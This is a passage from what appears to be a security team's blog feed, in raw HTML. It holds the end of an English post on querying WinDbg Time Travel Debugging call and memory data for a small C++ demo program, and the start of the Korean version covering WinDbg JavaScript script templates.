class="hljs-number">9</span>)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">std</span>::uniform_int_distribution&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">distValue</span><span class="hljs-params">(<span class="hljs-number">0</span>, <span class="hljs-number">1000</span>)</span></span>;    <span class="hljs-comment">// Create at least 10 instances</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;BaseProcessor&gt;&gt; processors;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; ++i) {        processors.push_back(<span class="hljs-built_in">std</span>::make_unique&lt;ConcreteProcessor&gt;());    }    <span class="hljs-comment">// Call virtual function 100 times with random instance and value</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; ++i) {        <span class="hljs-keyword">int</span> idx = distIndex(rng);        <span class="hljs-keyword">int</span> value = distValue(rng);        processors[idx]-&gt;process(value);    }    <span class="hljs-comment">// Wait for user input</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;All calls completed. Press Enter to exit...&quot;</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span>.get();    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><blockquote><p><del>It&#x2019;s no secret that ChatGPT wrote this too</del></p></blockquote><p>The code creates 10 instances, calls a virtual function 100 times, chooses random values and random instances, then waits.</p><p>Though extreme, I often face similar situations while analyzing.<br>My main purposes for using Calls and Memory are:</p><ol><li>Only function calls made by a specific instance  </li><li>Filtering by return value or argument  </li><li>Filtering calls or memory accesses before/after a given TTD position</li></ol><p>First, check how many times the function was called:</p><pre><code class="hljs arcade"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx @<span class="hljs-symbol">$calls</span>(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).<span class="hljs-built_in">Count</span>()@<span class="hljs-symbol">$calls</span>(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).<span class="hljs-built_in">Count</span>() : <span class="hljs-number">0x64</span></code></pre><p>That&#x2019;s 100 times. To see only calls made by the 5th instance, we first need that instance&#x2019;s address. Because it&#x2019;s created with <code>std::make_unique</code> (inlined), we can&#x2019;t directly list constructor calls.</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; u TTDCalls!main+b0TTDCalls!std::make_unique [C:\Program Files\Microsoft Visual Studio\<span class="hljs-number">2022</span>\Community\VC\Tools\MSVC\<span class="hljs-number">14.41</span><span class="hljs-number">.34120</span>\include\memory @ <span class="hljs-number">3597</span>] [inlined <span class="hljs-keyword">in</span> TTDCalls!main+<span class="hljs-number">0xb0</span> [D:\Src\WindbgExamplePrograms\TTDCalls\main.cpp @ <span class="hljs-number">34</span>]]:<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d91260 b908000000      mov     ecx,<span class="hljs-number">8</span><span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d91265 e8c6080000      call    TTDCalls!operator new (<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d91b30)<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d9126a <span class="hljs-number">488930</span>          mov     qword ptr [rax],rsi<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d9126d <span class="hljs-number">4889442420</span>      mov     qword ptr [rsp+<span class="hljs-number">20</span>h],rax<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d91272 <span class="hljs-number">488</span>b542438      mov     rdx,qword ptr [rsp+<span class="hljs-number">38</span>h]<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d91277 <span class="hljs-number">483</span>b542440      cmp     rdx,qword ptr [rsp+<span class="hljs-number">40</span>h]<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d9127c <span class="hljs-number">740</span>e            je      TTDCalls!main+<span class="hljs-number">0xdc</span> (<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d9128c)<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d9127e <span class="hljs-number">488</span>bcf          mov     rcx,rdi</code></pre><p>But we can list executions of the <code>operator new</code> instruction and pick the 5th one:</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx @$memory(<span class="hljs-number">0x7ff784d91265</span>, <span class="hljs-number">0x7ff784d91265</span>+<span class="hljs-number">1</span>, <span class="hljs-string">&quot;e&quot;</span>)[<span class="hljs-number">4</span>]@$memory(<span class="hljs-number">0x7ff784d91265</span>, <span class="hljs-number">0x7ff784d91265</span>+<span class="hljs-number">1</span>, <span class="hljs-string">&quot;e&quot;</span>)[<span class="hljs-number">4</span>]                    EventType        : <span class="hljs-number">0x1</span>    ThreadId         : <span class="hljs-number">0x567c</span>    UniqueThreadId   : <span class="hljs-number">0x2</span>    TimeStart        : <span class="hljs-number">4</span>D8:<span class="hljs-number">24</span>A2 [Time Travel]    TimeEnd          : <span class="hljs-number">4</span>D8:<span class="hljs-number">24</span>A2 [Time Travel]    AccessType       : Execute    IP               : <span class="hljs-number">0x7ff784d91265</span>    Address          : <span class="hljs-number">0x7ff784d91265</span>    Size             : <span class="hljs-number">0x5</span>    Value            : <span class="hljs-number">0x8c6e8</span>    SystemTimeStart  : <span class="hljs-number">2025</span>&#xB144; <span class="hljs-number">5</span>&#xC6D4; <span class="hljs-number">31</span>&#xC77C; &#xD1A0;&#xC694;&#xC77C; <span class="hljs-number">12</span>:<span class="hljs-number">24</span>:<span class="hljs-number">28.628</span>    SystemTimeEnd    : <span class="hljs-number">2025</span>&#xB144; <span class="hljs-number">5</span>&#xC6D4; <span class="hljs-number">31</span>&#xC77C; &#xD1A0;&#xC694;&#xC77C; <span class="hljs-number">12</span>:<span class="hljs-number">24</span>:<span class="hljs-number">28.628</span><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx @$memory(<span class="hljs-number">0x7ff784d91265</span>, <span class="hljs-number">0x7ff784d91265</span>+<span class="hljs-number">1</span>, <span class="hljs-string">&quot;e&quot;</span>)[<span class="hljs-number">4</span>].TimeStart.SeekTo()(<span class="hljs-number">43f</span>8<span class="hljs-number">.567</span>c): Break instruction exception - code <span class="hljs-number">80000003</span> (first/second chance <span class="hljs-keyword">not</span> available)Time Travel Position: <span class="hljs-number">4</span>D8:<span class="hljs-number">24</span>A2</code></pre><p>By looking at the <code>TimeStart</code> and <code>TimeEnd</code> fields, we can see when this memory access event started and when it ended. We can jump to that point in time by pressing <code>[Time Travel]</code> next to the position, or by calling the <code>SeekTo</code> method of <code>TimeStart</code> or <code>TimeEnd</code> directly.</p><p>Now we can determine the address of the fifth instance from the return value of <code>operator new</code> and use <code>Where</code> to see only the <code>process</code> calls of that instance, as shown below, or we can use Calls and access the <code>ReturnValue</code> field to find out without going to the position.</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx @$memory(<span class="hljs-number">0x7ff784d91265</span>, <span class="hljs-number">0x7ff784d91265</span>+<span class="hljs-number">1</span>, <span class="hljs-string">&quot;e&quot;</span>)[<span class="hljs-number">4</span>].TimeStart.SeekTo()(<span class="hljs-number">43f</span>8<span class="hljs-number">.567</span>c): Break instruction exception - code <span class="hljs-number">80000003</span> (first/second chance <span class="hljs-keyword">not</span> available)Time Travel Position: <span class="hljs-number">4</span>D8:<span class="hljs-number">24</span>A2<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; pTime Travel Position: <span class="hljs-number">4</span>D8:<span class="hljs-number">25</span>EATTDCalls!main+<span class="hljs-number">0xba</span>:<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d9126a <span class="hljs-number">488930</span>          mov     qword ptr [rax],rsi ds:<span class="hljs-number">000001e0</span>`<span class="hljs-number">00059750</span>=<span class="hljs-number">6562575</span>c32336d65<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; r raxrax=<span class="hljs-number">000001e000059750</span><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx @$calls(<span class="hljs-string">&quot;TTDCalls!operator new&quot;</span>).Where(x =&gt; x.ReturnAddress == <span class="hljs-number">0x7ff784d9126a</span>)[<span class="hljs-number">0x8</span>].ReturnValue@$calls(<span class="hljs-string">&quot;TTDCalls!operator new&quot;</span>).Where(x =&gt; x.ReturnAddress == <span class="hljs-number">0x7ff784d9126a</span>)[<span class="hljs-number">0x8</span>].ReturnValue                 : <span class="hljs-number">0x1e000059750</span> [Type: <span class="hljs-built_in">void</span> *]</code></pre><p>If you only want to see calls made by a specific instance, you can use the first argument (<code>this</code>), which is the address of the instance, right? In this example, we have the pdb as well as the source code, so we can also go directly to the name of the parameter instead of the index in <code>Parameters</code>.</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx @$calls(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).Where(x =&gt; x.Parameters[<span class="hljs-number">0</span>] == <span class="hljs-number">0x1e000059750</span>)@$calls(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).Where(x =&gt; x.Parameters[<span class="hljs-number">0</span>] == <span class="hljs-number">0x1e000059750</span>)                    [<span class="hljs-number">0x6</span>]               [<span class="hljs-number">0xf</span>]               [<span class="hljs-number">0x21</span>]              [<span class="hljs-number">0x2a</span>]              [<span class="hljs-number">0x2c</span>]              [<span class="hljs-number">0x2f</span>]              [<span class="hljs-number">0x32</span>]              [<span class="hljs-number">0x39</span>]              [<span class="hljs-number">0x3f</span>]              [<span class="hljs-number">0x43</span>]              [<span class="hljs-number">0x57</span>]              [<span class="hljs-number">0x5e</span>]</code></pre><p>Need only the arguments? Pipe to <code>Select(...)</code> and display with <code>-g</code>.</p><p>Of course, you can use other conditions in the <code>Where</code>, or you can implement the TTD position comparison as an extension and add it as a condition in the <code>Where</code></p><p>Putting it all together, you can produce queries like:</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx -r1 @$calls(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).Where(x =&gt; x.Parameters.<span class="hljs-keyword">this</span> == <span class="hljs-number">0x1e000059750</span>)[<span class="hljs-number">6</span>]@$calls(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).Where(x =&gt; x.Parameters.<span class="hljs-keyword">this</span> == <span class="hljs-number">0x1e000059750</span>)[<span class="hljs-number">6</span>]                    EventType        : <span class="hljs-number">0x0</span>    ThreadId         : <span class="hljs-number">0x567c</span>    UniqueThreadId   : <span class="hljs-number">0x2</span>    TimeStart        : <span class="hljs-number">4</span>DA:<span class="hljs-number">10</span>F0 [Time Travel]    TimeEnd          : <span class="hljs-number">4</span>DA:<span class="hljs-number">10</span>F3 [Time Travel]    Function         : TTDCalls!ConcreteProcessor::process    FunctionAddress  : <span class="hljs-number">0x7ff784d911a0</span>    ReturnAddress    : <span class="hljs-number">0x7ff784d9134e</span>    Parameters          SystemTimeStart  : <span class="hljs-number">2025</span>&#xB144; <span class="hljs-number">5</span>&#xC6D4; <span class="hljs-number">31</span>&#xC77C; &#xD1A0;&#xC694;&#xC77C; <span class="hljs-number">12</span>:<span class="hljs-number">24</span>:<span class="hljs-number">28.633</span>    SystemTimeEnd    : <span class="hljs-number">2025</span>&#xB144; <span class="hljs-number">5</span>&#xC6D4; <span class="hljs-number">31</span>&#xC77C; &#xD1A0;&#xC694;&#xC77C; <span class="hljs-number">12</span>:<span class="hljs-number">24</span>:<span class="hljs-number">28.633</span><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx -r1 @$calls(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).Where(x =&gt; x.Parameters.<span class="hljs-keyword">this</span> == <span class="hljs-number">0x1e000059750</span>)[<span class="hljs-number">94</span>]@$calls(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).Where(x =&gt; x.Parameters.<span class="hljs-keyword">this</span> == <span class="hljs-number">0x1e000059750</span>)[<span class="hljs-number">94</span>]                    EventType        : <span class="hljs-number">0x0</span>    ThreadId         : <span class="hljs-number">0x567c</span>    UniqueThreadId   : <span class="hljs-number">0x2</span>    TimeStart        : <span class="hljs-number">4</span>DB:<span class="hljs-number">820</span> [Time Travel]    TimeEnd          : <span class="hljs-number">4</span>DB:<span class="hljs-number">823</span> [Time Travel]    Function         : TTDCalls!ConcreteProcessor::process    FunctionAddress  : <span class="hljs-number">0x7ff784d911a0</span>    ReturnAddress    : <span class="hljs-number">0x7ff784d9134e</span>    Parameters          SystemTimeStart  : <span class="hljs-number">2025</span>&#xB144; <span class="hljs-number">5</span>&#xC6D4; <span class="hljs-number">31</span>&#xC77C; &#xD1A0;&#xC694;&#xC77C; <span class="hljs-number">12</span>:<span class="hljs-number">24</span>:<span class="hljs-number">28.633</span>    SystemTimeEnd    : <span class="hljs-number">2025</span>&#xB144; <span class="hljs-number">5</span>&#xC6D4; <span class="hljs-number">31</span>&#xC77C; &#xD1A0;&#xC694;&#xC77C; <span class="hljs-number">12</span>:<span class="hljs-number">24</span>:<span class="hljs-number">28.633</span><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx @$calls(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).Where(x =&gt; x.Parameters.<span class="hljs-keyword">this</span> != <span class="hljs-number">0x1e000059750</span> &amp;&amp; @$poscmp(x.TimeStart, <span class="hljs-string">&quot;4DA:10F0&quot;</span>) &gt; <span class="hljs-number">0</span> &amp;&amp; @$poscmp(<span class="hljs-string">&quot;4DB:823&quot;</span>, x.TimeEnd) &lt; <span class="hljs-number">0</span>)@$calls(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).Where(x =&gt; x.Parameters.<span class="hljs-keyword">this</span> != <span class="hljs-number">0x1e000059750</span> &amp;&amp; @$poscmp(x.TimeStart, <span class="hljs-string">&quot;4DA:10F0&quot;</span>) &gt; <span class="hljs-number">0</span> &amp;&amp; @$poscmp(<span class="hljs-string">&quot;4DB:823&quot;</span>, x.TimeEnd) &lt; <span class="hljs-number">0</span>)                    [<span class="hljs-number">0x5f</span>]              [<span class="hljs-number">0x60</span>]              [<span class="hljs-number">0x61</span>]              [<span class="hljs-number">0x62</span>]              [<span class="hljs-number">0x63</span>]          </code></pre><p>The above command determines the position of the first and last <code>process</code> calls of the fifth <code>ConcreteProcessor</code> instance and lists only the <code>process</code> calls of other instances that were called between them.</p><h1 id="Wrapping-up"><a href="#Wrapping-up" class="headerlink" title="Wrapping up"></a>Wrapping up</h1><p>After finishing, it feels like this post talks more about WinDbg&#x2019;s TTD data objects (<code>Calls</code>, <code>Memory</code>) than about scripting itself &#x1F605;. It wouldn&#x2019;t have been bad to cover how to write and use scripts based on the <a href="https://learn.microsoft.com/ko-kr/windows-hardware/drivers/debugger/javascript-debugger-scripting">MS documentation</a>, but I didn&#x2019;t feel like reading it all;; I also learned by roughly studying <strong>0vercl0k</strong>&#x2019;s <a href="https://github.com/0vercl0k/windbg-scripts">examples</a> and using only very simple scripts, yet the difference between <em>with</em> and <em>without</em> scripts was clear. I already thought TTD alone was revolutionary, and every time I learn a new feature I wonder how I ever lived without it.</p><p><img src="/2025/06/01/pwndorei/windbg_js_en/image%206.png" alt="image.png"></p><p>Anyway, thanks for reading this post, and I hope my teammates give it a try!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windbg/">windbg</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/TTD/">TTD</category>
      
      <category domain="https://hackyboiz.github.io/tags/Debugging/">Debugging</category>
      
      
      <comments>https://hackyboiz.github.io/2025/06/01/pwndorei/windbg_js_en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] windbg를 위한 javascript 한 스푼</title>
      <link>https://hackyboiz.github.io/2025/06/01/pwndorei/windbg_js/</link>
      <guid>https://hackyboiz.github.io/2025/06/01/pwndorei/windbg_js/</guid>
      <pubDate>Sun, 01 Jun 2025 14:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC13</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, pwndorei&#xC785;&#xB2C8;&#xB2E4;&#x2026; &#xC791;&#xB144; 9&#xC6D4; &#xC815;&#xB3C4;&#xBD80;&#xD130; &#xD68C;&#xC0AC;&#xC5D0; &#xB2E4;&#xB2C8;&#xAE30; &#xC2DC;&#xC791;&#xD558;&#xBA74;&#xC11C; &#xADF8;&#xB3D9;&#xC548; &#xC5F0;&#xAD6C;&#xAE00;&#xC744; &#xCB49; &#xC26C;&#xC5C8;&#xB294;&#xB370; &#xC774;&#xC820; &#xB354;&#xC774;&#xC0C1; &#xD53C;&#xD560; &#xC218; &#xC5C6;&#xAC8C; &#xB418;&#xC5B4; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4; &#x1F926;&#x1F3FB;&#x200D;&#x2642;&#xFE0F; &#xADFC;&#xB370; &#xD68C;&#xC0AC;&#xC77C; &#xB9D0;&#xACE0;&#xB294; &#xC5F0;&#xAD6C;&#xD558;&#xB294;&#xAC8C; &#xC5C6;&#xC5B4;&#xC11C; &#xAE00;&#xB85C; &#xC4F8;&#xB9CC;&#xD55C; &#xC8FC;&#xC81C;&#xAC00; &#xB531;&#xD788; &#xB5A0;&#xC624;&#xB974;&#xC9C8; &#xC54A;&#xB354;&#xB77C;&#xACE0;&#xC694;. &#xADF8;&#xB798;&#xC11C; &#xADF8;&#xB0E5; windbg&#xB85C; &#xBD84;&#xC11D;&#xD560;&#xB54C; &#xC4F0;&#xAE30; &#xC88B;&#xC740; js &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC120;&#xBCF4;&#xC774;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xAC00;&#xBCF4;&#xC2DC;&#xC8E0;!</p><h1 id="Windbg-Script-&#x21D2;"><a href="#Windbg-Script-&#x21D2;" class="headerlink" title="Windbg + Script &#x21D2; ?"></a>Windbg + Script &#x21D2; ?</h1><p>&#xB514;&#xBC84;&#xAE45;&#xC744; &#xD558;&#xB294;&#xB370; &#xC788;&#xC5B4;&#xC11C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;? &#xBAA9;&#xC801;&#xC740; &#xB2E8; &#xD558;&#xB098;, &#xAC8C;&#xC73C;&#xB974;&#xAC8C; &#xB514;&#xBC84;&#xAE45;&#xD558;&#xAE30; &#xC704;&#xD568;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/06/01/pwndorei/windbg_js/image.png" alt="image.png"></p><blockquote><p><del>&#xC808;&#xB300; &#xBBF8;&#xB9AC; &#xACE0;&#xC0DD;&#xD574;&#xC11C; &#xB098;&#xC911;&#xC5D0; &#xD3B8;&#xD558;&#xC790;&#xB294;&#xAC8C; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;</del></p></blockquote><p>&#xC5C4;&#xCCAD; &#xBCF5;&#xC7A1;&#xD558;&#xAC8C; &#xC0DD;&#xACA8;&#xBA39;&#xC740; &#xC790;&#xB8CC;&#xAD6C;&#xC870;&#xB97C; &#xD558;&#xB098;&#xD558;&#xB098; &#xC815;&#xC131;&#xC2A4;&#xB7FD;&#xAC8C; dq, dd &#xD558;&#xBA74;&#xC11C; &#xC5B4;&#xB5A4; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xBB3C;&#xB860; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. TTD&#xB97C; &#xC4F0;&#xBA74; &#xC911;&#xC694;&#xD55C; call&#xC744; &#xC2E4;&#xC218;&#xB85C; step over&#xD574;&#xBC84;&#xB824;&#xB3C4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0C8;&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xC73C;&#xB2C8; &#xBB34;&#xC9C0;&#xC131;&#xC73C;&#xB85C; F10&#xB9CC; &#xB20C;&#xB7EC;&#xAC00;&#xBA74;&#xC11C; &#xBD84;&#xC11D;&#xD574;&#xB3C4; &#xB429;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC;! &#xB370;&#xC774;&#xD130;&#xAC00; &#xCEE4;&#xC9C0;&#xBA74; &#xCEE4;&#xC9C8;&#xC218;&#xB85D; &#xC190;&#xC218; &#xC791;&#xC5C5;&#xD558;&#xB294; &#xAC83;&#xBCF4;&#xB2E4; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC9DC;&#xB294; &#xD3B8;&#xC774; &#xC2DC;&#xAC04;&#xC774; &#xB354; &#xC801;&#xAC8C; &#xAC78;&#xB9AC;&#xACE0; TTD&#xB3C4; &#xB108;&#xBB34; &#xC758;&#xC874;&#xD558;&#xB2E4;&#xAC00;&#xB294; &#xBC14;&#xBCF4;&#xAC00; &#xB418;&#xC5B4;&#xBC84;&#xB9BD;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xC624;&#xB298;&#xC740; &#xAC04;&#xB2E8;&#xD55C; &#xC608;&#xC2DC;&#xB85C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC4F0;&#xBA74; &#xC88B;&#xC744;&#xC9C0; &#xC54C;&#xC544;&#xBCF4;&#xACE0; &#xB364;&#xC73C;&#xB85C; TTD&#xB97C; &#xADF9;&#xD55C;&#xAE4C;&#xC9C0; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xB3C4; &#xC54C;&#xB824;&#xB4DC;&#xB9AC;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Windbg-Script-Basic"><a href="#Windbg-Script-Basic" class="headerlink" title="Windbg Script Basic"></a>Windbg Script Basic</h1><p>&#xC77C;&#xB2E8; windbg&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; Scripting &#xBA54;&#xB274;&#xC5D0;&#xC11C; &#xC0C8;&#xB85C;&#xC6B4; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xAC70;&#xB098; &#xAE30;&#xC874; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xBD88;&#xB7EC;&#xC62C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. JavaScript&#xB9D0;&#xACE0; NatVis&#xB77C;&#xB294; &#xAC83;&#xB3C4; &#xC788;&#xAE34; &#xD55C;&#xB370; &#xC6B0;&#xB9AC;&#xAC00; &#xC4F8;&#xAC74; JavaScript&#xC774;&#xB2C8;&#xAE4C; &#xADF8;&#xB0E5; &#xBB34;&#xC2DC;&#xD569;&#xC2DC;&#xB2E4;.</p><p><img src="/2025/06/01/pwndorei/windbg_js/image%201.png" alt="image.png"></p><p>&#xADF8; &#xB2E4;&#xC74C;&#xC73C;&#xB85C; New Script&#xC5D0;&#xC11C; &#xC0C8;&#xB85C; &#xB9CC;&#xB4E4; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC758; &#xD615;&#xC2DD;&#xC744; Extension, Imperative &#xC911;&#xC5D0; &#xACE0;&#xB97C; &#xC218; &#xC788;&#xB294;&#xB370; &#xC774;&#xAC74; &#xADF8;&#xB0E5; &#xAE30;&#xBCF8; &#xD15C;&#xD50C;&#xB9BF; &#xCC28;&#xC774;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Imperative&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xAE30;&#xBCF8; &#xCF54;&#xB4DC;&#xAC00; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initializeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    <span class="hljs-keyword">return</span> [<span class="hljs-keyword">new</span> host.apiVersionSupport(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>)];}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">invokeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    <span class="hljs-comment">//</span>    <span class="hljs-comment">// Insert your script content here.  This method will be called whenever the script is</span>    <span class="hljs-comment">// invoked from a client.</span>    <span class="hljs-comment">//</span>    <span class="hljs-comment">// See the following for more details:</span>    <span class="hljs-comment">//</span>    <span class="hljs-comment">//     https://aka.ms/JsDbgExt</span>    <span class="hljs-comment">//</span>}</code></pre><p>Actions&#xC5D0;&#xC11C; &#xC9C1;&#xC811; Execute&#xB97C; &#xB204;&#xB974;&#xAC70;&#xB098; <code>.scriptrun</code> &#xB4F1;&#xC758; &#xCEE4;&#xB9E8;&#xB4DC;&#xB85C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/06/01/pwndorei/windbg_js/image%202.png" alt="image.png"></p><p>Extension&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xC774;&#xB984;&#xCC98;&#xB7FC; &#xD655;&#xC7A5; &#xAE30;&#xB2A5;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xAE30;&#xBCF8; &#xCF54;&#xB4DC;&#xAC00; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initializeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    <span class="hljs-comment">//</span>    <span class="hljs-comment">// Return an array of registration objects to modify the object model of the debugger</span>    <span class="hljs-comment">// See the following for more details:</span>    <span class="hljs-comment">//</span>    <span class="hljs-comment">//     https://aka.ms/JsDbgExt</span>    <span class="hljs-comment">//</span>    <span class="hljs-keyword">return</span> [<span class="hljs-keyword">new</span> host.apiVersionSupport(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>)];}</code></pre><p>&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; &#xCD94;&#xAC00;&#xB41C; extension&#xC740; windbg &#xCEE4;&#xB9E8;&#xB4DC;&#xC5D0;&#xC11C; <code>!extname</code>&#xACFC; &#xAC19;&#xC740; &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xD574;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC5B4;&#xB5A4; &#xAE30;&#xB2A5;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0;&#xB294; &#xB4A4;&#xC5D0;&#xC11C; &#xC608;&#xC81C;&#xC640; &#xD568;&#xAED8; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACE0; &#xADF8; &#xC804;&#xC5D0; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xAD00;&#xB828; &#xCEE4;&#xB9E8;&#xB4DC; &#xBA87;&#xAC00;&#xC9C0;&#xB9CC; &#xB9C8;&#xC800; &#xC54C;&#xC544;&#xBCF4;&#xC790;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;</p><ul><li><p><code>.scriptlist</code></p><ul><li><p>&#xD604;&#xC7AC; &#xB85C;&#xB4DC;&#xB41C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC804;&#xBD80; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs routeros">0:038&gt; .scriptlistCommand Loaded Scripts:<span class="hljs-built_in">..</span>.    JavaScript<span class="hljs-built_in"> script </span><span class="hljs-keyword">from</span> <span 